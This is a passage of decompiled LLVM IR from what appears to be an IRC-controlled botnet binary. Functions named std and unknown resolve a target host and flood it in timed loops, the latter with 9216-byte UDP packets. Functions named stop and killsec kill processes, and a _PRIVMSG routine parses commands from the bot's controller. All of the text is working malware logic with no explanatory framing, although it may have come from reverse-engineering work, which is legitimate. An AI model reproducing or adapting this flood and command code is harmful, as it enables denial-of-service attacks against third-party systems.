  br i1 %tmp27, label %dec_label_pc_10000d48, label %dec_label_pc_10000d3c

dec_label_pc_10000d3c:                            ; preds = %dec_label_pc_10000d10
  %tmp28 = icmp slt i32 %v4_10000d24, 20
  br i1 %tmp28, label %dec_label_pc_10000d50, label %dec_label_pc_10000d48

dec_label_pc_10000d48:                            ; preds = %dec_label_pc_10000d3c, %dec_label_pc_10000d10
  %v0_10000d4c = call i32 @__GI_exit()
  br label %dec_label_pc_10000d50

dec_label_pc_10000d50:                            ; preds = %dec_label_pc_10000d3c, %dec_label_pc_10000d48
  %v2_10000d58 = add i32 %v2_10000c50, 60
  %v3_10000d60 = add i32 %v2_10000d58, %v4_10000d24
  %v4_10000d60 = inttoptr i32 %v3_10000d60 to i8*
  store i8 0, i8* %v4_10000d60, align 1
  %v1_10000d68 = add i32 %v2_10000c50, -1
  %v2_10000d70 = add i32 %v1_10000d68, %v4_10000d24
  %v1_10000d74 = add i32 %v2_10000d70, 60
  %v2_10000d74 = inttoptr i32 %v1_10000d74 to i8*
  %v3_10000d74 = load i8, i8* %v2_10000d74, align 1
  %v3_10000d7c = icmp eq i8 %v3_10000d74, 10
  br i1 %v3_10000d7c, label %dec_label_pc_10000da4, label %dec_label_pc_10000d84

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d50
  %v3_10000d94 = load i8, i8* %v2_10000d74, align 1
  %v3_10000d9c = icmp eq i8 %v3_10000d94, 13
  br i1 %v3_10000d9c, label %dec_label_pc_10000da4, label %dec_label_pc_10000dbc

dec_label_pc_10000da4:                            ; preds = %dec_label_pc_10000d84, %dec_label_pc_10000d50
  store i8 0, i8* %v2_10000d74, align 1
  br label %dec_label_pc_10000dbc

dec_label_pc_10000dbc:                            ; preds = %dec_label_pc_10000d84, %dec_label_pc_10000da4
  %v1_10000dc0 = add i32 %v2_10000c50, -2
  %v2_10000dc8 = add i32 %v1_10000dc0, %v4_10000d24
  %v1_10000dcc = add i32 %v2_10000dc8, 60
  %v2_10000dcc = inttoptr i32 %v1_10000dcc to i8*
  %v3_10000dcc = load i8, i8* %v2_10000dcc, align 1
  %v3_10000dd4 = icmp eq i8 %v3_10000dcc, 10
  br i1 %v3_10000dd4, label %dec_label_pc_10000dfc, label %dec_label_pc_10000ddc

dec_label_pc_10000ddc:                            ; preds = %dec_label_pc_10000dbc
  %v3_10000dec = load i8, i8* %v2_10000dcc, align 1
  %v3_10000df4 = icmp eq i8 %v3_10000dec, 13
  br i1 %v3_10000df4, label %dec_label_pc_10000dfc, label %dec_label_pc_10000e14

dec_label_pc_10000dfc:                            ; preds = %dec_label_pc_10000ddc, %dec_label_pc_10000dbc
  store i8 0, i8* %v2_10000dcc, align 1
  br label %dec_label_pc_10000e14

dec_label_pc_10000e14:                            ; preds = %dec_label_pc_10000ddc, %dec_label_pc_10000dfc
  %v3_10000e18 = load i32, i32* @global_var_1001d82c.269, align 4
  %v6_10000e38 = call i32 @Send(i32 %v4_10000bd8, i32 ptrtoint ([25 x i8]* @global_var_1000b808.270 to i32), i32 %v2_10000d10, i32 %v3_10000e18, i32 268500992)
  store i32 268439108, i32* @lr, align 4
  %v1_10000e40 = call i32 @__libc_close(i32 %v4_10000bd8)
  store i32 ptrtoint ([3 x i8]* @global_var_10000e4c.271 to i32), i32* @lr, align 4
  %v1_10000e48 = call i32 @__libc_close(i32 %v3_10000b18)
  %v0_10000e50 = call i32 @__GI_exit()
  br label %dec_label_pc_10000e54

dec_label_pc_10000e54:                            ; preds = %dec_label_pc_10000bac, %dec_label_pc_10000b90, %dec_label_pc_10000b34, %entry, %dec_label_pc_10000e14
  %v0_10000e68 = phi i32 [ 0, %dec_label_pc_10000bac ], [ -1, %dec_label_pc_10000b90 ], [ -1, %dec_label_pc_10000b34 ], [ -1, %entry ], [ %v0_10000e50, %dec_label_pc_10000e14 ]
  ret i32 %v0_10000e68

; uselistorder directives
  uselistorder i8* %v2_10000dcc, { 1, 0, 2 }
  uselistorder i8* %v2_10000d74, { 1, 0, 2 }
  uselistorder i32 %v4_10000d24, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000cec, { 0, 2, 1 }
  uselistorder i32 %v1_10000c2c, { 1, 0 }
  uselistorder i32 %v1_10000c64, { 1, 0 }
  uselistorder i32* %v1_10000c5c, { 1, 0, 2 }
  uselistorder i32 %v2_10000bfc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10000bd8, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1212, { 1, 0 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder i32 60, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10000e54, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10000e14, { 1, 0 }
  uselistorder label %dec_label_pc_10000dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10000d50, { 1, 0 }
  uselistorder label %dec_label_pc_10000cd4, { 1, 0 }
  uselistorder label %dec_label_pc_10000bfc, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_10000e94 = icmp sgt i32 %arg3, 2
  br i1 %v2_10000e94, label %dec_label_pc_10000ea4, label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %entry
  %v0_10000ea0 = call i32 @__GI_exit()
  br label %dec_label_pc_10000ea4

dec_label_pc_10000ea4:                            ; preds = %entry, %dec_label_pc_10000e9c
  store i32 268439220, i32* @lr, align 4
  %v3_10000eb0 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268439236, i32* @lr, align 4
  %v1_10000ec0 = call i32 @__GI_time(i32 0)
  %v1_10000ed0 = add i32 %arg4, 12
  %v1_10000ed4 = inttoptr i32 %v1_10000ed0 to i32*
  %v2_10000ed4 = load i32, i32* %v1_10000ed4, align 4
  store i32 268439264, i32* @lr, align 4
  %v2_10000edc = call i32 @atol(i32 %v2_10000ed4, i32 %v1_10000ed0)
  %v1_10000eec = call i32 @mfork(i32 %arg2)
  %v3_10000ef4 = icmp eq i32 %v1_10000eec, 0
  br i1 %v3_10000ef4, label %dec_label_pc_10000efc, label %dec_label_pc_10001024

dec_label_pc_10000efc:                            ; preds = %dec_label_pc_10000ea4
  %v1_10000f00 = add i32 %arg4, 4
  %v1_10000f04 = inttoptr i32 %v1_10000f00 to i32*
  %v2_10000f04 = load i32, i32* %v1_10000f04, align 4
  store i32 268439312, i32* @lr, align 4
  %v2_10000f0c = call i32 @__GI_gethostbyname(i32 %v2_10000f04, i32 %v1_10000f00)
  %v2_10000f18 = ptrtoint i32* %stack_var_-52 to i32
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v1_10000f40 = add i32 %v2_10000f0c, 16
  %v2_10000f40 = inttoptr i32 %v1_10000f40 to i32*
  %v3_10000f40 = load i32, i32* %v2_10000f40, align 4
  %v1_10000f44 = inttoptr i32 %v3_10000f40 to i32*
  %v2_10000f44 = load i32, i32* %v1_10000f44, align 4
  %v2_10000f4c = ptrtoint i32* %stack_var_-48 to i32
  %v1_10000f54 = add i32 %v2_10000f0c, 12
  %v2_10000f54 = inttoptr i32 %v1_10000f54 to i32*
  %v3_10000f54 = load i32, i32* %v2_10000f54, align 4
  store i32 %v3_10000f54, i32* @r5, align 4
  store i32 268439400, i32* @lr, align 4
  %v4_10000f64 = call i32 @bcopy(i32 %v2_10000f44, i32 %v2_10000f4c, i32 %v3_10000f54, i32 %v2_10000f0c)
  %v1_10000f6c = add i32 %v2_10000f0c, 8
  %v2_10000f6c = inttoptr i32 %v1_10000f6c to i32*
  %v3_10000f6c = load i32, i32* %v2_10000f6c, align 4
  %v1_10000f70 = urem i32 %v3_10000f6c, 65536
  store i32 %v1_10000f70, i32* %stack_var_-52, align 4
  %v1_10000f7c = add i32 %arg4, 8
  %v1_10000f80 = inttoptr i32 %v1_10000f7c to i32*
  %v2_10000f80 = load i32, i32* %v1_10000f80, align 4
  store i32 268439436, i32* @lr, align 4
  %v2_10000f88 = call i32 @atol(i32 %v2_10000f80, i32 %v1_10000f7c)
  %v2_10000ff0 = add i32 %v2_10000edc, %v1_10000ec0
  br label %dec_label_pc_10000fa0

dec_label_pc_10000fa0:                            ; preds = %dec_label_pc_10001014, %dec_label_pc_10000efc
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10000efc ], [ %v1_10001018, %dec_label_pc_10001014 ]
  %tmp19 = icmp ult i32 %storemerge1, 50
  br i1 %tmp19, label %dec_label_pc_10001014, label %dec_label_pc_10000fac

dec_label_pc_10000fac:                            ; preds = %dec_label_pc_10000fa0
  store i32 268439492, i32* @lr, align 4
  %v5_10000fc0 = call i32 @__libc_send(i32 %v3_10000eb0, i32 ptrtoint ([4 x i8]* @global_var_1000b824.273 to i32), i32 50, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10000fd8.274 to i32), i32* @lr, align 4
  %v3_10000fd4 = call i32 @__libc_connect(i32 %v3_10000eb0, i32 %v2_10000f18, i32 16)
  store i32 268439520, i32* @lr, align 4
  %v1_10000fdc = call i32 @__GI_time(i32 0)
  %v2_10000ff4 = icmp ult i32 %v1_10000fdc, %v2_10000ff0
  br i1 %v2_10000ff4, label %dec_label_pc_1000100c, label %dec_label_pc_10000ffc

dec_label_pc_10000ffc:                            ; preds = %dec_label_pc_10000fac
  store i32 ptrtoint ([3 x i8]* @global_var_10001004.275 to i32), i32* @lr, align 4
  %v1_10001000 = call i32 @__libc_close(i32 %v3_10000eb0)
  %v0_10001008 = call i32 @__GI_exit()
  br label %dec_label_pc_1000100c

dec_label_pc_1000100c:                            ; preds = %dec_label_pc_10000fac, %dec_label_pc_10000ffc
  br label %dec_label_pc_10001014

dec_label_pc_10001014:                            ; preds = %dec_label_pc_10000fa0, %dec_label_pc_1000100c
  %stack_var_-72.0 = phi i32 [ %storemerge1, %dec_label_pc_10000fa0 ], [ 0, %dec_label_pc_1000100c ]
  %v1_10001018 = add i32 %stack_var_-72.0, 1
  br label %dec_label_pc_10000fa0

dec_label_pc_10001024:                            ; preds = %dec_label_pc_10000ea4
  ret i32 %v1_10000eec

; uselistorder directives
  uselistorder i32 %v3_10000f54, { 1, 0 }
  uselistorder i32 %v2_10000f0c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder label %dec_label_pc_10001014, { 1, 0 }
  uselistorder label %dec_label_pc_1000100c, { 1, 0 }
  uselistorder label %dec_label_pc_10000ea4, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001054 = load i32, i32* %r3.global-to-local, align 4
  %v3_100011442 = load i32, i32* @global_var_1001d824.265, align 4
  %v2_1000114c3 = icmp eq i32 %v3_100011442, 0
  br i1 %v2_1000114c3, label %dec_label_pc_10001154, label %dec_label_pc_10001070.lr.ph

dec_label_pc_10001070.lr.ph:                      ; preds = %entry
  %v3_100010c4 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_10001070

dec_label_pc_10001070:                            ; preds = %dec_label_pc_10001070.lr.ph, %dec_label_pc_10001134
  %v0_1000116c9 = phi i32 [ %v0_10001054, %dec_label_pc_10001070.lr.ph ], [ %v0_1000116c8, %dec_label_pc_10001134 ]
  %storemerge15 = phi i32 [ 0, %dec_label_pc_10001070.lr.ph ], [ %v1_10001138, %dec_label_pc_10001134 ]
  %v1_10001074 = mul i32 %storemerge15, 4
  %v3_10001080 = load i32, i32* @global_var_1001d850.266, align 4
  %v2_10001084 = add i32 %v3_10001080, %v1_10001074
  %v1_10001088 = inttoptr i32 %v2_10001084 to i32*
  %v2_10001088 = load i32, i32* %v1_10001088, align 4
  %v3_1000108c = icmp eq i32 %v2_10001088, 0
  br i1 %v3_1000108c, label %dec_label_pc_10001134, label %dec_label_pc_10001094

dec_label_pc_10001094:                            ; preds = %dec_label_pc_10001070
  %v2_100010ac = load i32, i32* %v1_10001088, align 4
  store i32 268439732, i32* @lr, align 4
  %v0_100010b0 = call i32 @__libc_getpid()
  store i32 %v0_100010b0, i32* %r3.global-to-local, align 4
  %v4_100010b8 = icmp eq i32 %v2_100010ac, %v0_100010b0
  br i1 %v4_100010b8, label %dec_label_pc_10001134, label %dec_label_pc_100010c0

dec_label_pc_100010c0:                            ; preds = %dec_label_pc_10001094
  br i1 %v3_100010c4, label %dec_label_pc_1000110c, label %dec_label_pc_100010cc

dec_label_pc_100010cc:                            ; preds = %dec_label_pc_100010c0
  %v3_100010d0 = load i32, i32* @global_var_1001d84c.277, align 4
  %v3_100010e4 = load i32, i32* @global_var_1001d850.266, align 4
  %v2_100010e8 = add i32 %v3_100010e4, %v1_10001074
  %v1_100010ec = inttoptr i32 %v2_100010e8 to i32*
  %v2_100010ec = load i32, i32* %v1_100010ec, align 4
  store i32 %v0_10001054, i32* %r3.global-to-local, align 4
  %v6_10001108 = call i32 @Send(i32 %v0_10001054, i32 ptrtoint ([29 x i8]* @global_var_1000b828.278 to i32), i32 %v3_100010d0, i32 %v2_100010ec, i32 268500992)
  store i32 %v6_10001108, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000110c

dec_label_pc_1000110c:                            ; preds = %dec_label_pc_100010c0, %dec_label_pc_100010cc
  %v3_1000111c = load i32, i32* @global_var_1001d850.266, align 4
  %v2_10001120 = add i32 %v3_1000111c, %v1_10001074
  %v1_10001124 = inttoptr i32 %v2_10001120 to i32*
  %v2_10001124 = load i32, i32* %v1_10001124, align 4
  store i32 %v2_10001124, i32* %r3.global-to-local, align 4
  store i32 268439860, i32* @lr, align 4
  %v2_10001130 = call i32 @kill(i32 %v2_10001124, i32 9)
  store i32 %v2_10001130, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001134

dec_label_pc_10001134:                            ; preds = %dec_label_pc_10001094, %dec_label_pc_10001070, %dec_label_pc_1000110c
  %v0_1000116c8 = phi i32 [ %v0_100010b0, %dec_label_pc_10001094 ], [ %v0_1000116c9, %dec_label_pc_10001070 ], [ %v2_10001130, %dec_label_pc_1000110c ]
  %v1_10001138 = add i32 %storemerge15, 1
  %v3_10001144 = load i32, i32* @global_var_1001d824.265, align 4
  %v2_1000114c = icmp ult i32 %v1_10001138, %v3_10001144
  br i1 %v2_1000114c, label %dec_label_pc_10001070, label %dec_label_pc_10001140.dec_label_pc_10001154_crit_edge

dec_label_pc_10001140.dec_label_pc_10001154_crit_edge: ; preds = %dec_label_pc_10001134
  br label %dec_label_pc_10001154

dec_label_pc_10001154:                            ; preds = %entry, %dec_label_pc_10001140.dec_label_pc_10001154_crit_edge
  %v0_1000116c = phi i32 [ %v0_1000116c8, %dec_label_pc_10001140.dec_label_pc_10001154_crit_edge ], [ %v0_10001054, %entry ]
  ret i32 %v0_1000116c

; uselistorder directives
  uselistorder i32 %v1_10001074, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %v0_10001054, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 5, 3, 6, 0, 1 }
  uselistorder label %dec_label_pc_10001154, { 1, 0 }
  uselistorder label %dec_label_pc_10001134, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000110c, { 1, 0 }
  uselistorder label %dec_label_pc_10001070, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 1, i32* %stack_var_-48, align 4
  store i32 9216, i32* @r3, align 4
  store i32 268439972, i32* @lr, align 4
  %v0_100011a0 = call i32 @malloc()
  store i32 268439988, i32* @lr, align 4
  %v1_100011b0 = call i32 @__GI_time(i32 0)
  %v1_100011c0 = call i32 @mfork(i32 %arg2)
  %v3_100011c8 = icmp eq i32 %v1_100011c0, 0
  br i1 %v3_100011c8, label %dec_label_pc_100011d0, label %dec_label_pc_10001354

dec_label_pc_100011d0:                            ; preds = %entry
  %v3_100011d4 = icmp eq i32 %arg3, 2
  br i1 %v3_100011d4, label %dec_label_pc_100011e4, label %dec_label_pc_100011dc

dec_label_pc_100011dc:                            ; preds = %dec_label_pc_100011d0
  %v0_100011e0 = call i32 @__GI_exit()
  br label %dec_label_pc_100011e4

dec_label_pc_100011e4:                            ; preds = %dec_label_pc_100011d0, %dec_label_pc_100011dc
  %v1_100011e8 = add i32 %arg4, 8
  %v1_100011ec = inttoptr i32 %v1_100011e8 to i32*
  %v2_100011ec = load i32, i32* %v1_100011ec, align 4
  store i32 268440056, i32* @lr, align 4
  %v2_100011f4 = call i32 @atol(i32 %v2_100011ec, i32 %v1_100011e8)
  %v2_10001200 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  %v1_10001228 = add i32 %arg4, 4
  %v1_1000122c = inttoptr i32 %v1_10001228 to i32*
  %v2_1000122c = load i32, i32* %v1_1000122c, align 4
  store i32 268440124, i32* @lr, align 4
  %v3_10001238 = call i32 @host2ip(i32 %arg2, i32 %v2_1000122c, i32 %v1_10001228)
  store i32 2, i32* %stack_var_-44, align 4
  %v3_10001250 = load i32, i32* @global_var_1001d84c.277, align 4
  %v2_1000125c = load i32, i32* %v1_1000122c, align 4
  %v6_10001278 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000b848.279 to i32), i32 %v3_10001250, i32 %v2_1000125c, i32 268500992)
  %v2_10001320 = add i32 %v2_100011f4, %v1_100011b0
  %v2_100012b8 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_1000127c

dec_label_pc_1000127c:                            ; preds = %dec_label_pc_10001334, %dec_label_pc_100011e4
  %stack_var_-56.0 = phi i32 [ %tmp, %dec_label_pc_100011e4 ], [ %v1_10001338, %dec_label_pc_10001334 ]
  store i32 268440192, i32* @lr, align 4
  %v0_1000127c = call i32 @random()
  store i32 268440220, i32* @lr, align 4
  %v3_10001298 = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_100012a8 = icmp slt i32 %v3_10001298, 0
  br i1 %v1_100012a8, label %dec_label_pc_100012fc, label %dec_label_pc_100012b0

dec_label_pc_100012b0:                            ; preds = %dec_label_pc_1000127c
  store i32 1, i32* %stack_var_-48, align 4
  store i32 268440276, i32* @lr, align 4
  %v3_100012d0 = call i32 @ioctl(i32 %v3_10001298, i32 -2147195266, i32 %v2_100012b8)
  store i32 268440308, i32* @lr, align 4
  %v6_100012f0 = call i32 @__libc_sendto(i32 %v3_10001298, i32 %v0_100011a0, i32 9216, i32 0, i32 %v2_10001200, i32 16)
  store i32 268440316, i32* @lr, align 4
  %v1_100012f8 = call i32 @__libc_close(i32 %v3_10001298)
  br label %dec_label_pc_100012fc

dec_label_pc_100012fc:                            ; preds = %dec_label_pc_1000127c, %dec_label_pc_100012b0
  %tmp20 = icmp slt i32 %stack_var_-56.0, 50
  br i1 %tmp20, label %dec_label_pc_10001334, label %dec_label_pc_10001308

dec_label_pc_10001308:                            ; preds = %dec_label_pc_100012fc
  store i32 268440336, i32* @lr, align 4
  %v1_1000130c = call i32 @__GI_time(i32 0)
  %v2_10001324 = icmp ult i32 %v1_1000130c, %v2_10001320
  br i1 %v2_10001324, label %dec_label_pc_1000132c, label %dec_label_pc_10001344

dec_label_pc_1000132c:                            ; preds = %dec_label_pc_10001308
  br label %dec_label_pc_10001334

dec_label_pc_10001334:                            ; preds = %dec_label_pc_100012fc, %dec_label_pc_1000132c
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_100012fc ], [ 0, %dec_label_pc_1000132c ]
  %v1_10001338 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_1000127c

dec_label_pc_10001344:                            ; preds = %dec_label_pc_10001308
  store i32 ptrtoint ([3 x i8]* @global_var_1000134c.281 to i32), i32* @lr, align 4
  %v1_10001348 = call i32 @__libc_close(i32 %v3_10001298)
  %v0_10001350 = call i32 @__GI_exit()
  br label %dec_label_pc_10001354

dec_label_pc_10001354:                            ; preds = %entry, %dec_label_pc_10001344
  %v0_10001368 = phi i32 [ %v1_100011c0, %entry ], [ %v0_10001350, %dec_label_pc_10001344 ]
  ret i32 %v0_10001368

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 0, 2, 1 }
  uselistorder i32 50, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @atol, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10001354, { 1, 0 }
  uselistorder label %dec_label_pc_10001334, { 1, 0 }
  uselistorder label %dec_label_pc_100012fc, { 1, 0 }
  uselistorder label %dec_label_pc_100011e4, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001394 = load i32, i32* bitcast ([9 x i8*]* @global_var_1001d7d4.287 to i32*), align 16
  store i32 %v3_10001394, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  %v3_100013a0 = call i32 @__GI_strcasecmp(i32 %v3_10001394, i32 %arg2)
  %v3_100013a8 = icmp eq i32 %v3_100013a0, 0
  br i1 %v3_100013a8, label %dec_label_pc_100013b0, label %dec_label_pc_100013bc

dec_label_pc_100013b0:                            ; preds = %entry
  store i32 268440508, i32* @lr, align 4
  %v2_100013b8 = call i32 @kill(i32 0, i32 9)
  br label %dec_label_pc_100013bc

dec_label_pc_100013bc:                            ; preds = %entry, %dec_label_pc_100013b0
  %v0_100013d0 = phi i32 [ %v3_100013a0, %entry ], [ %v2_100013b8, %dec_label_pc_100013b0 ]
  ret i32 %v0_100013d0

; uselistorder directives
  uselistorder label %dec_label_pc_100013bc, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-1144 = alloca i32, align 4
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-1152 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100013d4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100013d4, i32* %stack_var_-1152, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_1000141870 = call i32 @__GI_strlen()
  store i32 %v0_1000141870, i32* %r3.global-to-local, align 4
  %v0_1000142071 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000142072 = icmp ult i32 %v0_1000142071, %v0_1000141870
  br i1 %v2_1000142072, label %dec_label_pc_10001428, label %dec_label_pc_10001448

dec_label_pc_10001404:                            ; preds = %dec_label_pc_10001428
  %v1_10001408 = add i32 %storemerge875, 1
  store i32 %v1_10001408, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_10001418 = call i32 @__GI_strlen()
  store i32 %v0_10001418, i32* %r3.global-to-local, align 4
  %v0_10001420 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001420 = icmp ult i32 %v0_10001420, %v0_10001418
  br i1 %v2_10001420, label %dec_label_pc_10001428, label %dec_label_pc_10001448

dec_label_pc_10001428:                            ; preds = %entry, %dec_label_pc_10001404
  %storemerge875 = phi i32 [ %v1_10001408, %dec_label_pc_10001404 ], [ 0, %entry ]
  %v2_10001434 = add i32 %storemerge875, %arg3
  %v1_10001438 = inttoptr i32 %v2_10001434 to i8*
  %v2_10001438 = load i8, i8* %v1_10001438, align 1
  %v3_10001440 = icmp eq i8 %v2_10001438, 32
  br i1 %v3_10001440, label %dec_label_pc_10001448, label %dec_label_pc_10001404

dec_label_pc_10001448:                            ; preds = %dec_label_pc_10001404, %dec_label_pc_10001428, %entry
  %storemerge8.lcssa = phi i32 [ 0, %entry ], [ %v1_10001408, %dec_label_pc_10001404 ], [ %storemerge875, %dec_label_pc_10001428 ]
  %v2_10001454 = add i32 %storemerge8.lcssa, %arg3
  %v3_1000145c = inttoptr i32 %v2_10001454 to i8*
  store i8 0, i8* %v3_1000145c, align 1
  %v1_10001478 = add i32 %v2_10001454, 2
  %v5_1000147c = inttoptr i32 %v1_10001478 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_100014a062 = call i32 @__GI_strlen()
  store i32 %v0_100014a062, i32* %r3.global-to-local, align 4
  %v0_100014a863 = load i32, i32* %r29.global-to-local, align 4
  %v2_100014a864 = icmp ult i32 %v0_100014a863, %v0_100014a062
  br i1 %v2_100014a864, label %dec_label_pc_100014b0, label %dec_label_pc_100014d0

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_100014b0
  %v1_10001490 = add i32 %storemerge967, 1
  store i32 %v1_10001490, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_100014a0 = call i32 @__GI_strlen()
  store i32 %v0_100014a0, i32* %r3.global-to-local, align 4
  %v0_100014a8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100014a8 = icmp ult i32 %v0_100014a8, %v0_100014a0
  br i1 %v2_100014a8, label %dec_label_pc_100014b0, label %dec_label_pc_100014d0

dec_label_pc_100014b0:                            ; preds = %dec_label_pc_10001448, %dec_label_pc_1000148c
  %storemerge967 = phi i32 [ %v1_10001490, %dec_label_pc_1000148c ], [ 0, %dec_label_pc_10001448 ]
  %v2_100014bc = add i32 %storemerge967, %arg2
  %v1_100014c0 = inttoptr i32 %v2_100014bc to i8*
  %v2_100014c0 = load i8, i8* %v1_100014c0, align 1
  %v3_100014c8 = icmp eq i8 %v2_100014c0, 33
  br i1 %v3_100014c8, label %dec_label_pc_100014d0, label %dec_label_pc_1000148c

dec_label_pc_100014d0:                            ; preds = %dec_label_pc_1000148c, %dec_label_pc_100014b0, %dec_label_pc_10001448
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_10001448 ], [ %v1_10001490, %dec_label_pc_1000148c ], [ %storemerge967, %dec_label_pc_100014b0 ]
  %v2_100014dc = add i32 %storemerge9.lcssa, %arg2
  %v3_100014e4 = inttoptr i32 %v2_100014dc to i8*
  store i8 0, i8* %v3_100014e4, align 1
  %v2_100014ec = load i8, i8* %v5_1000147c, align 1
  %v3_100014f4 = icmp eq i8 %v2_100014ec, 33
  br i1 %v3_100014f4, label %dec_label_pc_100014fc, label %dec_label_pc_10001940

dec_label_pc_100014fc:                            ; preds = %dec_label_pc_100014d0
  %v3_10001500 = load i32, i32* @global_var_1001d84c.277, align 4
  store i32 %arg3, i32* @r3, align 4
  store i32 %v3_10001500, i32* @r4, align 4
  %v2_1000150c = call i32 @__GI_strcasecmp(i32 %arg3, i32 %v3_10001500)
  store i32 %v2_1000150c, i32* %r3.global-to-local, align 4
  %v3_10001514 = icmp eq i32 %v2_1000150c, 0
  br i1 %v3_10001514, label %dec_label_pc_1000151c, label %dec_label_pc_10001940

dec_label_pc_1000151c:                            ; preds = %dec_label_pc_100014fc
  %v2_1000151c = ptrtoint i32* %stack_var_-1076 to i32
  store i32 %v2_1000151c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10001534.288 to i32), i32* @lr, align 4
  %v3_10001530 = call i32 @__GI_memset(i32 %v2_1000151c, i32 0, i32 1024)
  %v1_10001540 = add i32 %v2_10001454, 3
  %v5_10001544 = inttoptr i32 %v1_10001540 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001540, i32* @r3, align 4
  %v0_1000156854 = call i32 @__GI_strlen()
  store i32 %v0_1000156854, i32* %r3.global-to-local, align 4
  %v0_1000157055 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000157056 = icmp ult i32 %v0_1000157055, %v0_1000156854
  br i1 %v2_1000157056, label %dec_label_pc_10001578, label %dec_label_pc_10001598

dec_label_pc_10001554:                            ; preds = %dec_label_pc_10001578
  %v1_10001558 = add i32 %storemerge1059, 1
  store i32 %v1_10001558, i32* %r29.global-to-local, align 4
  store i32 %v1_10001540, i32* @r3, align 4
  %v0_10001568 = call i32 @__GI_strlen()
  store i32 %v0_10001568, i32* %r3.global-to-local, align 4
  %v0_10001570 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001570 = icmp ult i32 %v0_10001570, %v0_10001568
  br i1 %v2_10001570, label %dec_label_pc_10001578, label %dec_label_pc_10001598

dec_label_pc_10001578:                            ; preds = %dec_label_pc_1000151c, %dec_label_pc_10001554
  %storemerge1059 = phi i32 [ %v1_10001558, %dec_label_pc_10001554 ], [ 0, %dec_label_pc_1000151c ]
  %v2_10001584 = add i32 %storemerge1059, %v1_10001540
  %v1_10001588 = inttoptr i32 %v2_10001584 to i8*
  %v2_10001588 = load i8, i8* %v1_10001588, align 1
  %v3_10001590 = icmp eq i8 %v2_10001588, 32
  br i1 %v3_10001590, label %dec_label_pc_10001598, label %dec_label_pc_10001554

dec_label_pc_10001598:                            ; preds = %dec_label_pc_10001554, %dec_label_pc_10001578, %dec_label_pc_1000151c
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_1000151c ], [ %v1_10001558, %dec_label_pc_10001554 ], [ %storemerge1059, %dec_label_pc_10001578 ]
  %v2_100015a4 = add i32 %storemerge10.lcssa, %v1_10001540
  %v3_100015ac = inttoptr i32 %v2_100015a4 to i8*
  store i8 0, i8* %v3_100015ac, align 1
  %v3_100015b8 = load i32, i32* @global_var_1001d834.289, align 4
